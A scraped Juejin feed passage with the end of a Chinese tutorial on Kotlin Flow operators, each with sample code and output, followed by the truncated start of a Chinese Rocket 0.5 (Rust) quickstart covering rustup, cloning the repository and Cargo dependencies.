<h3 data-id="heading-18">collectLatest</h3>
<p>终端操作符，当新值发出时，取消对前一个值的收集逻辑。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onEach { delay(<span class="hljs-number">100</span>) }
        .collectLatest { value -&gt;
            println(<span class="hljs-string">"Collecting <span class="hljs-variable">$value</span>"</span>)
            delay(<span class="hljs-number">300</span>)
            println(<span class="hljs-string">"Finished collecting <span class="hljs-variable">$value</span>"</span>)
        }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Collecting 1</span>
<span class="hljs-comment">// Collecting 2</span>
<span class="hljs-comment">// Collecting 3</span>
<span class="hljs-comment">// Finished collecting 3</span>
</code></pre>
<p><em>注意看这里的结果，Finished collecting 只收集了最后一次的值，一定要注意这个特性。</em></p>
<p>适用场景：某项操作耗时较长，且应在新项到达时被取消，例如将用户输入保存到数据库。</p>
<hr/>
<h2 data-id="heading-19">合并</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/debdb8739b2a4d94b5ac4348155e0fb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=7%2B6T%2FLUhSUM1fiRI0Bihj%2Bxro4c%3D" alt="6.png" loading="lazy"/></p>
<h3 data-id="heading-20">zip</h3>
<p>等待两个 <code>Flow</code> 各自发出一项后进行组合。任一源 <code>Flow</code> 结束，结果 <code>Flow</code> 即结束。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>)

    flowA.zip(flowB) { number, letter -&gt; <span class="hljs-string">"<span class="hljs-variable">$number</span><span class="hljs-variable">$letter</span>"</span> }
        .collect { println(it) } 
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1A</span>
<span class="hljs-comment">// 2B</span>
<span class="hljs-comment">// 3C</span>
</code></pre>
<h3 data-id="heading-21">combine</h3>
<p>组合两个 <code>Flow</code> 的最新值。只要任一源 <code>Flow</code> 发出新值（且双方至少各发出过一次），就会触发一次发射。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().onEach { delay(<span class="hljs-number">100</span>) }
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>).onEach { delay(<span class="hljs-number">150</span>) }

    flowA.combine(flowB) { number, letter -&gt; <span class="hljs-string">"<span class="hljs-variable">$number</span><span class="hljs-variable">$letter</span>"</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1A</span>
<span class="hljs-comment">// 2A</span>
<span class="hljs-comment">// 3A</span>
<span class="hljs-comment">// 3B</span>
</code></pre>
<p>适用场景：响应多个数据源的变化。</p>
<h3 data-id="heading-22">merge</h3>
<p>将多个 <code>Flow</code> 合并为一个，按发出顺序交错输出所有值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = flowOf(<span class="hljs-string">"A1"</span>, <span class="hljs-string">"A2"</span>).onEach { delay(<span class="hljs-number">100</span>) }
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"B1"</span>, <span class="hljs-string">"B2"</span>).onEach { delay(<span class="hljs-number">50</span>) }

    merge(flowA, flowB)
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// B1</span>
<span class="hljs-comment">// A1</span>
<span class="hljs-comment">// B2</span>
<span class="hljs-comment">// A2</span>
</code></pre>
<p>适用场景：将来自不同 UI 组件的多个事件流合并为单一处理流。</p>
<hr/>
<h2 data-id="heading-23">错误与完成处理</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95682e5dd75b4e80af39a6f3fb05b9cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=xwKucKREDlNVuyFwOpiP%2B7lj1lc%3D" alt="7.png" loading="lazy"/></p>
<h3 data-id="heading-24">catch</h3>
<p>捕获上游 <code>Flow</code>（即 <code>catch</code> 之前的操作符）中发生的异常，但不捕获下游收集器中的异常。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        emit(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Error!"</span>)
    }
    .<span class="hljs-keyword">catch</span> { e -&gt;
        println(<span class="hljs-string">"Caught: <span class="hljs-subst">${e.message}</span>"</span>)
        emit(-<span class="hljs-number">1</span>) <span class="hljs-comment">// Emit a fallback value</span>
    }
    .collect { println(it) } <span class="hljs-comment">// Emits 1, then -1</span>
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Caught: Error!</span>
<span class="hljs-comment">// -1</span>
</code></pre>
<p>适用场景：优雅地处理错误、提供默认值或记录失败信息。</p>
<h3 data-id="heading-25">onCompletion</h3>
<p>在 <code>Flow</code> 完成时（无论成功或异常）执行指定操作。成功时 <code>cause</code> 为 <code>null</code>。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onCompletion { cause -&gt;
            <span class="hljs-keyword">if</span> (cause != <span class="hljs-literal">null</span>) println(<span class="hljs-string">"Flow completed with error"</span>)
            <span class="hljs-keyword">else</span> println(<span class="hljs-string">"Flow completed successfully"</span>)
        }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// Flow completed successfully</span>
</code></pre>
<h3 data-id="heading-26">retryWhen</h3>
<p>在发生异常时根据谓词（包含异常原因和重试次数）决定是否重试。</p>
<pre><code class="hljs language-scss" lang="scss">suspend fun <span class="hljs-selector-tag">main</span>() {
    <span class="hljs-selector-tag">var</span> attemptCount = <span class="hljs-number">0</span>
    <span class="hljs-attribute">flow</span> {
        <span class="hljs-built_in">emit</span>(<span class="hljs-number">1</span>)
        if (attemptCount &lt; <span class="hljs-number">2</span>) {
            attemptCount++
            throw <span class="hljs-built_in">RuntimeException</span>("Transient error")
        }
        <span class="hljs-built_in">emit</span>(<span class="hljs-number">2</span>)
    }
    <span class="hljs-selector-class">.retryWhen</span> { cause, attempt -&gt;
        <span class="hljs-built_in">println</span>("Attempt $attempt: Retrying due to ${cause.message}")
        <span class="hljs-built_in">delay</span>(<span class="hljs-number">100</span>) <span class="hljs-comment">// Add a delay before retrying</span>
        attempt &lt; <span class="hljs-number">2</span> <span class="hljs-comment">// Retry up to 2 times</span>
    }
    <span class="hljs-selector-class">.catch</span> { <span class="hljs-built_in">println</span>("Caught final error: ${it.message}") }
    <span class="hljs-selector-class">.collect</span> { <span class="hljs-built_in">println</span>(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Attempt 0: Retrying due to Transient error</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Attempt 1: Retrying due to Transient error</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
</code></pre>
<p><code>retryWhen</code> 的回调有两个参数：</p>
<ul>
<li><code>cause</code>：导致 <code>Flow</code> 失败的异常（<code>Throwable</code> 类型）。</li>
<li><code>attempt</code>：当前是第几次重试，从 <code>0</code> 开始计数。</li>
</ul>
<hr/>
<h2 data-id="heading-27">工具与副作用</h2>
<h3 data-id="heading-28">onEach</h3>
<p>对 <code>Flow</code> 中每个元素执行指定操作，但不修改元素本身。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onEach { println(<span class="hljs-string">"About to process <span class="hljs-variable">$it</span>"</span>) }
        .map { it * it }
        .collect { println(<span class="hljs-string">"Processed value: <span class="hljs-variable">$it</span>"</span>) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// About to process 1</span>
<span class="hljs-comment">// Processed value: 1</span>
<span class="hljs-comment">// About to process 2</span>
<span class="hljs-comment">// Processed value: 4</span>
<span class="hljs-comment">// About to process 3</span>
<span class="hljs-comment">// Processed value: 9</span>
</code></pre>
<p>适用场景：用于日志、调试或埋点等副作用场景，在不改变数据的前提下观察 <code>Flow</code>。</p>
<h3 data-id="heading-29">debounce</h3>
<p>过滤在指定超时内被新值取代的值，仅发出“突发”中的最后一个值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        emit(<span class="hljs-number">1</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">2</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">3</span>)
        delay(<span class="hljs-number">500</span>)
        emit(<span class="hljs-number">4</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">5</span>)
    }.debounce(<span class="hljs-number">100</span>).collect { println(it) } 
}
<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 5</span>
</code></pre>
<p>适用场景：处理快速用户输入（如搜索框），避免每次按键都触发 API 请求。</p>
<h3 data-id="heading-30">distinctUntilChanged</h3>
<p>抑制与前一个值相同的重复发射。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)
        .distinctUntilChanged()
        .collect { println(it) } 
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
</code></pre>
<p>适用场景：防止 UI 因状态未变而进行不必要的重组或更新。</p>
<hr/>
<h2 data-id="heading-31">核心决策指南</h2>
<ul>
<li>数据转换。用于修改流中的值：<code>map</code>，<code>filter</code>，<code>distinctUntilChanged</code>。</li>
<li>累积值。用于跟踪状态或计算持续结果：<code>scan</code>，<code>runningReduce</code>，<code>fold</code>，<code>reduce</code>。</li>
<li>从单一输入发出多个值。用于自定义发射逻辑：<code>transform</code>。</li>
<li>处理嵌套或动态 <code>Flow</code>。根据内部 <code>Flow</code> 行为选择：<code>flatMapConcat</code>（顺序执行）、<code>flatMapMerge</code>（并发执行）、<code>flatMapLatest</code>（取消旧任务，保留最新）。</li>
<li>性能与背压控制。用于优化收集效率与响应性：<code>buffer</code>，<code>conflate</code>，<code>collectLatest</code>，<code>flowOn</code>。</li>
<li>合并多个流。用于组合多个数据源：<code>zip</code>（按顺序配对）、<code>combine</code>（组合最新值）、<code>merge</code>（交错合并）。</li>
<li>错误处理与完成逻辑。用于应对异常和生命周期事件：<code>catch</code>，<code>onCompletion</code>，<code>retryWhen</code>。</li>
<li>调试与副作用。用于插入日志或副作用操作：<code>onEach</code>。</li>
<li>处理高频发射。用于抑制过快的发射频率：<code>debounce</code>。</li>
<li>触发 <code>Flow</code> 执行。终端操作符：<code>collect</code>，<code>collectLatest</code>，<code>first</code>，<code>single</code>，<code>toList</code>，<code>reduce</code>，<code>fold</code>。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rocket 0.5 快速上手从克隆仓库到跑起第一个示例]]></title>    <link>https://juejin.cn/post/7581765536372391945</link>    <guid>https://juejin.cn/post/7581765536372391945</guid>    <pubDate>2025-12-10T02:42:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372391945" data-draft-id="7581727073582006323" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rocket 0.5 快速上手从克隆仓库到跑起第一个示例"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-10T02:42:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HelloReader"/> <meta itemprop="url" content="https://juejin.cn/user/2601910535729322"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rocket 0.5 快速上手从克隆仓库到跑起第一个示例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2601910535729322/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HelloReader
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:42:39.000Z" title="Wed Dec 10 2025 02:42:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、环境准备：先装好 Rust 工具链</h2>
<p>在写 Rocket 应用之前，第一步是安装 Rust。Rocket 官方推荐使用 <strong>rustup</strong> 来管理 Rust 版本。</p>
<h3 data-id="heading-1">1.1 为什么推荐 rustup？</h3>
<ul>
<li>支持多通道：<code>stable</code> / <code>beta</code> / <code>nightly</code> 可以随时切换</li>
<li>可以按目录覆盖版本：某个项目用 nightly，其他项目仍然用 stable</li>
<li>更新、卸载都很方便，基本“一条命令搞定”</li>
</ul>
<p>如果你还没安装 Rust，可以直接访问 rustup 官网（rustup.rs），按页面提示执行安装命令。安装完成后，在终端验证：</p>
<pre><code class="hljs language-bash" lang="bash">rustc --version
cargo --version
</code></pre>
<p>两个命令都输出版本号，就说明环境没问题。</p>
<blockquote>
<p>补充：Rocket 0.5 已经支持 <strong>Rust stable</strong>，但在 nightly 上的编译错误提示更友好。一个常见实践是：</p>
<ul>
<li>本地开发：nightly（体验更好）</li>
<li>线上构建：stable（更稳定）</li>
</ul>
</blockquote>
<h2 data-id="heading-2">二、最快体验方式：克隆 Rocket 仓库并运行示例</h2>
<p>Quickstart 推荐的第一条路径不是“新建项目”，而是：</p>
<blockquote>
<p><strong>克隆 Rocket 源码仓库，直接跑 examples 里的代码。</strong></p>
</blockquote>
<p>好处很明显：</p>
<ul>
<li>所有所需依赖已经配置好</li>
<li>示例覆盖常见场景，直接运行即可感受</li>
<li>遇到问题时可以顺带看看源码实现</li>
</ul>
<h3 data-id="heading-3">2.1 克隆 Rocket 仓库</h3>
<p>在终端执行：</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/rwf2/Rocket
<span class="hljs-built_in">cd</span> Rocket
</code></pre>
<p>然后切换到 0.5 版本的 tag（和文档保持一致）：</p>
<pre><code class="hljs language-bash" lang="bash">git checkout v0.5
</code></pre>
<p>这样可以避免 master 分支上可能存在的“未来改动”导致文档与代码不匹配。</p>
<h3 data-id="heading-4">2.2 运行 hello 示例</h3>
<p>所有示例都放在 <code>examples/</code> 目录下，先从最基础的 <code>hello</code> 开始：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> examples/hello
cargo run
</code></pre>
<p>如果构建成功，你会在终端看到类似输出：</p>
<pre><code class="hljs language-text" lang="text">🚀 Rocket has launched from http://127.0.0.1:8000
</code></pre>
<p>用浏览器打开：</p>
<pre><code class="hljs language-text" lang="text">http://127.0.0.1:8000
</code></pre>
<p>就可以看到你的第一个 Rocket 页面了。</p>
<h3 data-id="heading-5">2.3 更多示例：不是只有 Hello World</h3>
<p><code>examples/</code> 下的每一个子目录基本都是一个独立小 Demo，比如：</p>
<ul>
<li><code>examples/json</code>：演示 JSON API</li>
<li><code>examples/forms</code>：演示表单处理</li>
<li><code>examples/static_files</code>：演示静态文件服务</li>
<li><code>examples/chat</code>：演示实时聊天（结合异步流）</li>
<li>……</li>
</ul>
<p>进入任意一个示例目录，执行：</p>
<pre><code class="hljs language-bash" lang="bash">cargo run
</code></pre>
<p>就能体验对应功能，非常适合作为“学习入口 + 代码参考”。</p>
<h2 data-id="heading-6">三、为什么示例能直接跑？Cargo.toml 做了什么？</h2>
<p><strong>示例工程的 Cargo.toml 并不是从 crates.io 下载 Rocket，而是直接引用你刚刚克隆下来的本地 Rocket 源码。</strong></p>
<p>典型写法会类似这样（示意）：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { path = <span class="hljs-string">"../../core/lib"</span>, features = [<span class="hljs-string">"json"</span>] }
</code></pre>
<p>这样做有几个好处：</p>
<ul>
<li>对 Rocket 作者来说：改动框架源码后，直接在 examples 里验证是否一切正常</li>
<li>对你来说：clone 完整仓库后，无需配置依赖就能跑全套示例</li>
<li>对调试来说：可以顺手点进 Rocket 源码里看具体实现</li>
</ul>
<p>但是，当你把这些示例代码<strong>复制到自己项目里用</strong>时，就要注意了：</p>
<blockquote>
<p><strong>你不应该继续使用 path 依赖，而是应该改为正常的版本依赖。</strong></p>
</blockquote>
<h2 data-id="heading-7">四、基于示例创建自己的 Rocket 项目</h2>
<p>通常我们会这样操作：</p>
<ol>
<li>先在 <code>examples</code> 下找到一个功能接近需求的示例</li>
<li>确认它能正常跑</li>
<li>然后新建一个自己的项目，把示例的核心代码复制过去，再调整依赖和结构</li>
</ol>
<p>下面是一个比较推荐的流程。</p>
<h3 data-id="heading-8">4.1 新建一个自己的项目</h3>
<p>比如我们想创建一个叫 <code>my-rocket-app</code> 的项目：</p>
<pre><code class="hljs language-bash" lang="bash">cargo new my-rocket-app --bin
<span class="hljs-built_in">cd</span> my-rocket-app
</code></pre>
<p>结构大概是：</p>
<pre><code class="hljs language-text" lang="text">my-rocket-app
├── Cargo.toml
└── src
    └── main.rs
</code></pre>
<h3 data-id="heading-9">4.2 修改 Cargo.toml：从本地 path 改为版本依赖</h3>
<p>示例工程用的是本地 path 依赖，而你自己的项目应该像普通 Rust 项目那样写：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"my-rocket-app"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2021"</span>

<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { version = <span class="hljs-string">"0.5.1"</span>, features = [<span class="hljs-string">"json"</span>, <span class="hljs-string">"secrets"</span>] }
<span class="hljs-comment"># 需要模板的话：</span>
<span class="hljs-comment"># rocket_dyn_templates = { version = "0.2.0", features = ["tera"] }</span>
</code></pre>
<p>这里注意两点：</p>
<ol>
<li>
<p><code>rocket</code> 直接指定 <code>0.5.x</code> 版本，而不是 <code>path = ...</code></p>
</li>
<li>
<p><code>features</code> 根据你的实际需求启用，例如：</p>
<ul>
<li><code>json</code>：启用 JSON 支持</li>
<li><code>secrets</code>：启用私有 Cookie（0.5 中默认是 off-by-default）</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">4.3 复制示例代码，调整成自己的 main.rs</h3>
<p>选一个你喜欢的示例（例如 <code>examples/hello</code>），打开 <code>src/main.rs</code>，你会看到类似代码（简化版）：</p>
